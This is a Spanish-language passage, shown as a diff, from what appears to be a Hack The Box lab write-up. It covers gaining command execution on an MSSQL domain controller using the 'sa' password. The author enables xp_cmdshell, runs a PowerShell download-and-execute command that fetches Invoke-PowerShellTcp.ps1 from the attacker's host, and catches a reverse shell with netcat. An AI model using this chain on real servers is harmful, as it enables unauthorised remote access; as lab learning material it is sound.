@@ -489,3 +489,108 @@ MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019
 MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
 ```
 posteriormente me conecte usando **mssqlclient**
+
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:MSSQLP@ssw0rd\!@10.10.11.51
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)>
+```
+Debido a que inicie sesión como usuario 'sa' intente ejecutar comandos con xp_cmd shell pero obtuve un error:
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta]
+└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:MSSQLP@ssw0rd\!@10.10.11.51
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)> xp_cmdshell "whoami"
+ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+SQL (sa  dbo@master)> 
+```
+Así que intente habilitar **xp_cmdshell** y logre la ejecución de comandos:
+
+```bash
+SQL (sa  dbo@master)> sp_configure "xp_cmdshell", 1
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> sp_configure "show advanced options", 1
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> reconfigure
+SQL (sa  dbo@master)> xp_cmdshell "whoami"
+output           
+--------------   
+sequel\sql_svc   
+
+NULL             
+```
+Posteriormente para generar una reverse shell utilice el script Invoke-PowerShellTcp.ps1 agregando al final del archivo:
+
+```bash
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.73 -Port 4443
+```
+Posteriormente coloque un servidor temporal donde tengo mi archivo **Invoke-PowerShellTcp.ps1** y en otra pestaña colocar un listener por el puerto 4443 finamente ejecute lo siguiente desde el MSSQL
+
+```bash
+xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.73/Invoke-PowerShellTcp.ps1\")"
+```
+
+```bash
+SQL (sa  dbo@master)> xp_cmdshell "whoami"
+output           
+--------------   
+sequel\sql_svc   
+
+NULL             
+
+SQL (sa  dbo@master)> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.73/Invoke-PowerShellTcp.ps1\")"
+```
+
+```bash
+┌──(root㉿kali)-[/opt]
+└─# python3 -m http.server 80    
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.51 - - [02/May/2025 16:49:15] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+```
+
+```bash
+┌──(root㉿kali)-[/opt]
+└─# nc -lvp 4443
+listening on [any] 4443 ...
+connect to [10.10.16.73] from sequel.htb [10.10.11.51] 63886
+Windows PowerShell running as user sql_svc on DC01
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+sequel\sql_svc
+PS C:\Windows\system32>
+```
+También es posible obtener una blind shell mediante la herramienta [ttyOverMSSQL](https://github.com/T1erno/ttyOverMSSQL)
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta/ttyOverMSSQL/ttyovermssql]
+└─# python3 ttyOverMSSQL.py -s 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --powershell 
+[✓] Successful login: sa@10.10.11.51
+[!] Trying to enable xp_cmdshell...
+PS C:\Windows\system32> whoami
+sequel\sql_svc
+
+PS C:\Windows\system32>
